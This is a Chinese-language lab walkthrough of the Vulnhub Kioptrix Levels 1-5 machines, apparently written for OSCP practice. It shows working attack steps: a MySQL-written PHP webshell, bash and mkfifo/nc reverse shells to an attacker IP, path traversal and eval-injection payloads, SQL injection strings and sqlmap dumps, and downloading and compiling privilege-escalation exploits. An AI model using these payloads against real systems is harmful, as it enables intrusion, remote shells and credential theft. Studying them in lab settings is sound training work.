---
title: oscp—vulnhub靶场训练
date: 2025-8-25updated: 2026-03-16 01:57:15
tags:   
  - Red team
categories: Cybersecurity
top: 100
reward: true
---

## 1-前言

**靶场**：https://www.vulnhub.com/?q=Kioptrix

注意网络联通问题:

1>网卡需要删除重建`.vmx`里面，要不然默认桥接

2>自建局域网宿主机为头即可`192.168.xx.1`，无需网关和`dns`

3>可以用`centos7`虚拟机看一下会自动分配`ip`吗，如果分配的奇怪可能是因为没有打开`VMware DHCP Service`或`VMware NAT Service`，`192.168.xx.254`一般是`VM`的`DHCP`服务器，没有的话可能就是没开启`DHCP`

**工具**：`searchsploit`(`kali`)，[Exploit-DB](https://gitlab.com/exploit-database/)，[扫描提权](https://github.com/peass-ng/PEASS-ng)

```bash
#基础提权
echo os.system('/bin/bash')

#调用 Python 启动 PTY
python -c 'import pty; pty.spawn("/bin/bash")'

# kali键盘全转发
stty raw -echo; fg

#排查SUID
find / -perm -4000 -type f -ls 2>/dev/null
```

<!--more-->

准备条件(我用的是`wsl2`的`kali`)：

```cmd
#kali系统
kali-linux

#必要的组件和更新	//运行exp
sudo apt update && sudo apt upgrade -y
sudo apt install -y build-essential git curl wget unzip vim tmux net-tools htop
sudo apt install -y python3 python3-pip python3-venv
sudo apt install -y openjdk-17-jdk
sudo apt install -y libssl-dev
sudo apt install -y netcat-traditional socat tcpdump wireshark
sudo apt install -y nmap traceroute dnsutils
sudo apt install -y exploitdb sqlmap john hydra metasploit-framework
以及其他自定义的必要组件
```

```cmd
#mysql写入文件
SELECT UNHEX('你的十六进制码') INTO DUMPFILE '/tmp/revshell';

SELECT '<?php system("bash -i >& /dev/tcp/攻击者IP/端口 0>&1"); ?>' 
INTO OUTFILE '/var/www/html/shell.php';
```

# Kioptrix 

### Kioptrix Level 1

`练习工具的使用`

##### 信息搜集

```cmd
#快速扫描
nmap -sn 192.168.110.0/24

#全端口扫描
nmap -p 1-65535 -T4 -A -v 192.168.110.129
```
![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/1.png)

```cmd
---寻找低版本的框架或者容器查找[exp]---
nikto -host 192.168.xxx.xx
nuclei -u 192.168.xxx.xx
```

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/2-0.png)

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/2-1.png)

```cmd
#查找exp利用
searchsploit mod_ssl
```

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/2.png)

对比可得3个可尝试exp

---

```cmd
#编译
gcc -o exploit 47080.c -lcrypto
#运行对应版本
./exploit -h								#帮助
./exploit | grep apache-1.3.20				#版本
./exploit 0x6b 192.168.110.129 80 -c 50			#运行
```

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/3.png)

流程是这么个流程，但是这个exp太过于久远了，难以运行

所以换其它的不需要lcrypto的exp运行

##### 攻击方式

```cmd
#存在139端口samba服务，且得知系统为linux框架
```

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/1.png)

搜索该服务：

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/4-0.png)

发现非常多的exp，但是nmap没有版本，难不成这么多exp一个个试？

有两种方法msfconsole/nuclei跑出版本，msfconsole跑出版本前提是需要存在版本泄露的漏洞，虽然nuclei也是一样，但是架不住快呀:

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/4-1.png)

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/4-2.png)

---

```cmd
#或者nuclei直接跑出版本号
nuclei.exe -u http://192.168.110.129:139
```

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/4-3.png)

跑出版本2.2.1a就可以直接跑小于2.2.8这个版本的了

直接编译运行即可

```cmd
 #编译
 gcc 10.c -o samba_exp		#-o为输出文件
```

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/5.png)

```cmd
#查看帮助
./samba_exp
```

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/5-2.png)

```cmd
#运行
./samba_exp -b0 192.168.110.129	#-b为目标，0为linux
```

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/6.png)

```cmd
---
找出版本后直接在msfconsole上搜索exp跑也可以
---
```

![扫描的tcp连接内容](../image/oscp-image-log/easy/Kioptrix_Level_1/0.png)

```cmd
---
其他的服务版本都很低，可以信息搜集后用工具跑，低权限就uname -a查看内核版本，看searchsploit里面有无提权exp，或者直接cs上线跑提权工具
---
```

##### 总结

1.渗透主要是信息搜集

2.主要练习了工具使用

#### 参考的文章

[`Lab 1-Vulnhub - Kioptix Level 1 - KUANTECH - `博客园](https://www.cnblogs.com/KUANTECH/p/17941528)

---

### Kioptrix Level 2

`web测试`

##### 信息搜集

![信息搜集](../image/oscp-image-log/easy/Kioptrix_Level_2/nmap-1.png)

##### 漏洞挖掘

```
#存在sql注入
http://192.168.xxx.131/index.php
#存在命令执行
http://192.168.xxx.131/pingit.php
```

存在`web`权限，直接反弹`shell`，然后发现还有`gcc`、`wget`、`java`和`python`等环境齐全，通过[扫描提权](https://github.com/peass-ng/PEASS-ng)，然后直接[工具](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9435.tgz)梭哈即可

![命令执行](../image/oscp-image-log/easy/Kioptrix_Level_2/RCE-2.png)

![提权](../image/oscp-image-log/easy/Kioptrix_Level_2/PrivEsc-1.png)

##### 总结

1.熟悉`owasp top 10`漏洞

2.渗透测试的思路

### Kioptrix Level 3

`web测试`

注意：需要将下面的放到你的hosts文件内

```
<ip> kioptrix3.com	#靶场

#C:\Windows\System32\drivers\etc\hosts
#/etc/hosts
```

##### 信息搜集

测试：

​	可以在网上搜`LotusCMS`的源码或者直接搜它的历史漏洞之类的，但是今天搜历史漏洞可以把它老底都暴光，搜源码，然后看对应接口长什么样子的，保证一定的公平性。

index.php的源码如下：

```php
<?php
session_start();
if(file_exists("install.php")){
	header("Location: install.php");	
}
require("core/lib/router.php");
new Router();
?>
```

##### 代码审计

###### 文件包含

<img src="../image/oscp-image-log/easy/Kioptrix_Level_3/源码-1.png" alt="php" style="zoom:60%;" />

​	如上图就加载了两个功能，第一个功能是安装，那主要功能肯定在`router.php`了，如下：
![php](../image/oscp-image-log/easy/Kioptrix_Level_3/文件包含-1.png)

​	可以得出一个通用的结论如果参数名是 `?system=`、`?page=`、`?file=` 或 `?view=`，很可能是文件包含；后端开发者通常使用这个参数来决定加载哪个模块（比如 `Admin.php`、`Login.php`），当然这是16年前的代码了，放在现在肯定行不通了。

​	如下证明`php`是`5.2.4`

![php](../image/oscp-image-log/easy/Kioptrix_Level_3/php版本特性.png)

```
payload: http://<ip:port>/index.php?system=../../../../../../etc/passwd%001
```

​	目前很少看到 "`url`即`api`" 了，大多都是网页 "`Hash`路由+其他域名`api`" 的实现

| **截断方式**        | **依赖环境**     | **现代防御状态**                        |
| ------------------- | ---------------- | --------------------------------------- |
| **Null Byte (%00)** | PHP < 5.3.4      | **已失效** (PHP 核心已加固)             |
| **Path Length**     | 操作系统底层限制 | **极难实现** (现代 PHP 会预校验)        |
| **RFI Query (?)**   | 开启 URL 包含    | **已禁用** (默认关闭 allow_url_include) |
| **点号/空格**       | 旧版 Windows     | **已失效**                              |

![php](../image/oscp-image-log/easy/Kioptrix_Level_3/超管密码-1.png)

###### 命令执行

代码还是那一串(危险函数`eval()`)：

```cmd
	public function Router(){
		//Get page request (if any)
		$page = $this->getInputString("page", "index");
		
		//Get plugin request (if any)
		$plugin = $this->getInputString("system", "Page");
		
		if(file_exists("core/plugs/".$plugin."Starter.php")){
			//Include Page fetcher
			include("core/plugs/".$plugin."Starter.php");

			//Fetch the page and get over loading cache etc...
			eval("new ".$plugin."Starter('".$page."');");
```

原本拼接是：

```
/index.php?system=Admin
拼接：
eval(new AdminStarter('index');)
注意，page是没有的话是默认的index
```

正常执行的`php`

```php
phpinfo();
```

所以

```php
#payload:	/index.php?system=Page&page=index');phpinfo();/*
#拼接后的代码：
eval("new PageStarter('index');phpinfo();/*');");

#或者			/index.php?system=Page&page='.phpinfo().'
#更加优雅  '. phpinfo() .'  取代了   ".$page." 完成一次解析然后会返回一个布尔值 true  真是优雅啊~！！
eval("new PageStarter(''.phpinfo().'');");
#想要传参就要解析.phpinfo().
```

![RCE](../image/oscp-image-log/easy/Kioptrix_Level_3/命令执行-1.png)

##### 测试靶场

之后同理，反弹`shell`后提权，(好像`bash -i`用不了，`>`用不了，`cd`用不了等等的，但是还好`wget`能用)

利用文件包含执行代码：
![RCE](../image/oscp-image-log/easy/Kioptrix_Level_3/文件包含-2.png)

然后就遇到了一堆`exp`用不了的情况了

```
#寻找系统中配置错误且带有特殊权限的可执行文件。
find / -perm -4000 2>/dev/null
```

```bash
# 第一步：调用 Python 启动 PTY
python -c 'import pty; pty.spawn("/bin/bash")'

# kali键盘全转发
ctrl+z
stty raw -echo; fg

#找到当前目录下所有的root关键字
grep -rnw "." -e "password"
grep -C 5 "password" gconfig.php
```

![RCE](../image/oscp-image-log/easy/Kioptrix_Level_3/grep操作-1.png)

![RCE](../image/oscp-image-log/easy/Kioptrix_Level_3/grep操作-2.png)

然后可以在`root`账户的数据库里找到其他两个账号，然后尝试用`ht`编辑器直接更改`/etc/passwd`

```bash
# 第1步：设置变量
export TERM=xterm

# 第2步：现在运行 ht 应该就能看到蓝色界面了
/usr/local/bin/ht
```

![RCE](../image/oscp-image-log/easy/Kioptrix_Level_3/编辑器ht.png)

或者直接使用[脏牛内核提权](https://www.exploit-db.com/exploits/40839)

原理是条件竞争，使得数据直接写入了受保护的只读文件`/etc/passwd`，所以要稍微等一下，然后控制台需要正常一点

注意：使用了脏牛`root`就会被覆盖了

![RCE](../image/oscp-image-log/easy/Kioptrix_Level_3/脏牛漏洞-1.png)

#### 参考文章

[vulnhub KioptrixVM3 靶场练习&LotusCMS漏洞分析 - rpsate - 博客园](https://www.cnblogs.com/masses0x1/p/15780876.html)

[CTF实战 | Kioptrix（#3）靶机渗透测试 - FreeBuf网络安全行业门户](https://www.freebuf.com/news/170656.html)

[渗透测试——Kioptrix3靶机多种方法渗透提权（脏牛漏洞提权，手把手详细教程）-CSDN博客](https://blog.csdn.net/m0_73812072/article/details/155023122)



### Kioptrix Level 4

`web测试`

因为是受限环境(`IDS`)，如果排查`SUID`或者`sql`不当被检测到了就会被踢出系统，然后用户还会被封禁；

**配置**：[`vulnhub`](https://www.vulnhub.com/)只给了一个虚拟磁盘，配置如下：

| **设置项**     | **值**               |
| -------------- | -------------------- |
| **磁盘类型**   | **IDE**              |
| **I/O 控制器** | **LSI Logic**        |
| **硬件兼容性** | **Workstation 10.x** |
| **版本**       | **Linux 2.6.x **     |

`如果服务老是炸掉是正常的，因为我也炸`

##### **信息搜集**

![](../image/oscp-image-log/easy/Kioptrix_Level_4/nmap-1.png)

`/database.sql`泄露了用户名

![](../image/oscp-image-log/easy/Kioptrix_Level_4/用户名泄露.png)

```sql
#如果username存在注入可以直接
username = 1' OR 1=1 LIMIT 0,1 #'
password = 1' or 1='1'
```

只有一个登录网页，一看没有`sql`报错，只有`php`显示一个函数错误，要盲注，找到表和库后直接交给`sqlmap`吧

(登录会直接给密码账号的，其实找到账号可以直接登录即可)

![](../image/oscp-image-log/easy/Kioptrix_Level_4/sql-1.png)

###### `sql`注入

通过`1=1`，`1=2`回显不同判定可以使用布尔盲注：

```
’or 1=1'
'or 1=2'
```

然后用`user()`,`database()`没事，然后用`version()`、`substr`有时候没反应，也不知道是有（`IDS`）还是虚拟机问题

```cmd
' and database() like 'a%' #

#爆炸了，应该是有IDS，但是简单的大小写就可以绕过了
' Or VErsion() like '5%' #	
```

```cmd
#匹配长度
LIKE 'A_'
#跑密码
' or (select password from members.members where username='robert') like 'A%' #
```

或者直接使用`sqlmap`跑(可能把服务跑崩，当然用`bp`抓包也可能被插件跑封禁，跑`sql`没跑好也`ban`，所以使用`sqlmap`反而快一些)：

```cmd
python sqlmap.py -r 1.txt --batch --dbms=mysql --method=POST --level 3 --risk 2 -D members -T members -C "username,password" --dump
```

![](../image/oscp-image-log/easy/Kioptrix_Level_4/sqlmap-1.png)

```bash
#基础提权
echo os.system('/bin/bash')

#下载提权检查工具
wget http://xxx/linpeas.sh
chmod +x linpeas.sh

#排查漏洞
./linpeas.sh

#执行exp发现无gcc环境
#策略从 “本地编译”转向“寻找现成工具”或“环境提权”
```

##### 方法一：静态编译

```bash
gcc -m32 -static 5093.c -o exp_32
```

##### 方法二：`mysql`提权

三个条件：

1.存在`lib_mysqludf_sys.so`

2.可增删改

3.`secure_file_priv` 必须为空 

存在`mysql`以`root`权限运行，并且无密码，可以用`UDF`提权；

```mysql
select sys_exec('usermod -a -G admin robert');
```

![](../image/oscp-image-log/easy/Kioptrix_Level_4/sql-ps.png)

```bash
#使用本身密码
sudo su
```

#### 参考文章

[`Vulnhub-Kioptrix4 - FreeBuf`网络安全行业门户](https://www.freebuf.com/articles/web/427578.html)

[`Kioptix Level-4` `SQL`注入](https://zhuanlan.zhihu.com/p/26496108821)



### Kioptrix Level 5

##### **信息搜集**

系统的安装[`download.FreeBSD.org`](https://download.freebsd.org/releases/)

<img src="../image/oscp-image-log/easy/Kioptrix_Level_5/信息搜集-1.png" style="zoom:50%;" />

<img src="../image/oscp-image-log/easy/Kioptrix_Level_5/信息搜集-2.png" style="zoom:50%;" />

<img src="../image/oscp-image-log/easy/Kioptrix_Level_5/信息搜集-3.png" style="zoom: 50%;" />

##### 路径遍历

```http
#存在代码查看的功能有路径遍历---首页就有一个
#		include("../class/pData.class.php"); 
#查看配置文件，配置文件可以通过下载对应的freeBSD来查看
http://192.168.110.135/pChart2.1.3/examples/index.php?Action=View&Script=../../../../../../../../../../../usr/local/etc/apache22/httpd.conf
```

```html
#这个配置文件的意思是指定UA可以允许访问

SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>
```

![](../image/oscp-image-log/easy/Kioptrix_Level_5/phptax.png)

看到存在`phptax`可以找到[源码](https://sourceforge.net/projects/phptax/)

![](../image/oscp-image-log/easy/Kioptrix_Level_5/代码审计-1.png)

之后`php`解析+文件上传就简单了，参考[payload记录](https://cliayn.github.io/2025/04/24/payload%E8%AE%B0%E5%BD%95/)中的PERL REVERSE SHELL

主要涉及命令如下：

```bash
system("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ip $port > /tmp/f");
```

然后发现系统存在下载命令`fetch`，看了一下内核，然后直接找提权漏洞+提权即可

![系统信息](../image/oscp-image-log/easy/Kioptrix_Level_5/系统信息-1.png)

```bash
fetch http://192.168.xxx.xxx:8000/26368.c
gcc 26368.c -o test1
./test1
```

![kali](../image/oscp-image-log/easy/Kioptrix_Level_5/kali-1.png)

![](../image/oscp-image-log/easy/Kioptrix_Level_5/结束.png)
